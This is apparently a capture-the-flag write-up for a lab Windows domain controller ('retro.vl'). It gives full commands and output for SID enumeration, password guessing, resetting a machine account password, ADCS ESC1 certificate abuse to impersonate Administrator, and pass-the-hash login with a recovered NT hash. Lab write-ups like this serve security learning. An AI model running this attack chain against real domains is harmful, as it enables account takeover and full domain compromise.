Level = #Easy 
OS = #Windows
IP = 10.129.234.44
Host IP = 10.10.16.150

# Initial Scan
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sS -A 10.129.234.44 -Pn  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-26 14:05 -0400
Nmap scan report for 10.129.234.44
Host is up (0.096s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-26 18:05:37Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
|_ssl-date: 2026-06-26T18:07:04+00:00; -8s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
|_ssl-date: 2026-06-26T18:07:04+00:00; -8s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
|_ssl-date: 2026-06-26T18:07:04+00:00; -8s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
|_ssl-date: 2026-06-26T18:07:04+00:00; -8s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-06-26T18:07:04+00:00; -8s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-06-26T18:06:24+00:00
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2026-06-25T18:01:45
|_Not valid after:  2026-12-25T18:01:45
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-06-26T18:06:25
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: -8s, deviation: 0s, median: -8s

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   109.02 ms 10.10.16.1
2   147.95 ms 10.129.234.44

```

### Adding the domain
`echo "10.129.234.44 DC.retro.vl retro.vl" | sudo tee -a /etc/hosts`

### Impacket-lookupsid
```bash
┌──(kali㉿kali)-[~]
└─$ impacket-lookupsid anonymous@10.129.234.44 -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.129.234.44
[*] StringBinding ncacn_np:10.129.234.44[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172
498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: RETRO\Administrator (SidTypeUser)
501: RETRO\Guest (SidTypeUser)
502: RETRO\krbtgt (SidTypeUser)
512: RETRO\Domain Admins (SidTypeGroup)
513: RETRO\Domain Users (SidTypeGroup)
514: RETRO\Domain Guests (SidTypeGroup)
515: RETRO\Domain Computers (SidTypeGroup)
516: RETRO\Domain Controllers (SidTypeGroup)
517: RETRO\Cert Publishers (SidTypeAlias)
518: RETRO\Schema Admins (SidTypeGroup)
519: RETRO\Enterprise Admins (SidTypeGroup)
520: RETRO\Group Policy Creator Owners (SidTypeGroup)
521: RETRO\Read-only Domain Controllers (SidTypeGroup)
522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
525: RETRO\Protected Users (SidTypeGroup)
526: RETRO\Key Admins (SidTypeGroup)
527: RETRO\Enterprise Key Admins (SidTypeGroup)
553: RETRO\RAS and IAS Servers (SidTypeAlias)
571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
1000: RETRO\DC$ (SidTypeUser)
1101: RETRO\DnsAdmins (SidTypeAlias)
1102: RETRO\DnsUpdateProxy (SidTypeGroup)
1104: RETRO\trainee (SidTypeUser)
1106: RETRO\BANKING$ (SidTypeUser)
1107: RETRO\jburley (SidTypeUser)
1108: RETRO\HelpDesk (SidTypeGroup)
1109: RETRO\tblack (SidTypeUser)
```

### User File
```bash
Administrator
Guest
trainee
jburley
tblack
```

### SMB Enumeration
`nxc smb 10.129.234.44 -u 'Guest' -p '' --shares `
Found a share called Trainees and Notes
`smbclient //retro.vl/Trainees -U 'Guest'`

```bash
└─$  nxc smb retro.vl -u user.txt -p user.txt --continue-on-success
SMB         10.129.234.44   445    DC               [+] retro.vl\trainee:trainee 
```

After getting the credentials now Notes can be accessed
```bash
└─$ smbclient //retro.vl/Notes -U 'trainee%trainee'
Try "help" to get a list of possible commands.
smb: \> 
```
Reading through the files, first note says that the banking account is an old existing account that can be accessed. The second note had the `user flag`

Going back through the possible accounts, there is a BANKING$ Account.
With the information of the notes and how `Trainee` was accessed. Next step is to see if BANKING also has the some type of format.

Confirming that is true, when accessing anything with that account it will come up with ` retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`
Time to change the password.

### Changing the password to Banking
```bash
└─$ impacket-changepasswd retro.vl/'banking$':banking@10.129.234.44 -newpass 'password123!' -p rpc-samr
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of retro.vl\banking$
[*] Connecting to DCE/RPC as retro.vl\banking$
[*] Password was changed successfully.
```

```bash
└─$ nxc ldap retro.vl -u "BANKING$" -p 'password123!' -M adcs
LDAP        10.129.234.44   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:retro.vl) (signing:None) (channel binding:Never) 
LDAP        10.129.234.44   389    DC               [+] retro.vl\BANKING$:password123! 
ADCS        10.129.234.44   389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.234.44   389    DC               Found PKI Enrollment Server: DC.retro.vl
ADCS        10.129.234.44   389    DC               Found CN: retro-DC-CA
```

### Checking the Certs
`certipy-ad find -u 'BANKING$' -p 'password123!' -dc-ip 10.129.234.44 -vulnerable -stdout`

From this the `retro-DC-CA` is vulnerable to ESC1 attacks.

```bash
└─$ certipy-ad req -u 'BANKING$' -p 'password123!' -dc-ip 10.129.234.44 -ca retro-DC-CA -template RetroClients -upn Administrator -debug -target dc.retro.vl -key-size 4096 -sid S-1-5-21-2983547755-698260136-4283918172-500
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[+] Nameserver: '10.129.234.44'
[+] DC IP: '10.129.234.44'
[+] DC Host: None
[+] Target IP: None
[+] Remote Name: 'dc.retro.vl'
[+] Domain: ''
[+] Username: 'BANKING$'
[+] Trying to resolve 'dc.retro.vl' at '10.129.234.44'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.234.44[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.234.44[\pipe\cert]
[*] Request ID is 10
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[+] Could not find SID pattern in security extension
[+] Found SID in SAN URL: 's-1-5-21-2983547755-698260136s4283918172-500'
[*] Certificate object SID is 's-1-5-21-2983547755-698260136s4283918172-500'
[*] Saving certificate and private key to 'administrator.pfx'
[+] Attempting to write data to 'administrator.pfx'
[+] Data written to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```bash
$ certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain 'retro.vl' dc-ip 10.129.234.44 Certipy v4.8.2 - by Oliver Lyak (ly4k) 
[*] Saved credential cache to 'administrator.ccache' 
[*] Trying to retrieve NT hash for 'administrator' 
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
```

### Access to Root
`evil-winrm -u Administrator -H 252fac7066d93dd009d4fd2cd0368389 -i retro.vl`
Flag is in Desktop.